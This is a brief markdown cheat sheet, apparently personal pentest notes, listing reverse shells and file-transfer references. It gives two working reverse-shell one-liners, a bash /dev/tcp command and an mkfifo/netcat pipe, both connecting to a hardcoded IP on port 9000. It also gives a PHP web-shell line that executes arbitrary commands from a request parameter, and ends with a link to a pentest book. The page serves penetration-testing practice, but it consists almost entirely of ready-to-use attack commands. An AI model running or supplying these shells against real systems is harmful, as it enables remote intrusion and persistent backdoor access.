---
description: reverse shells for easy and quick reference.
---

# Reverse Shells / File Transfers

### List of Reverse Shells

```bash
bash -i >& /dev/tcp/10.18.88.214/9000 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9000 >/tmp/f


```

### PHP Shells / cmds

```bash
<?php system(GET["cmd"]) ?>
```

## File Transfers

* [https://github.com/six2dez/pentest-book/tree/master/exploitation](https://github.com/six2dez/pentest-book/tree/master/exploitation)











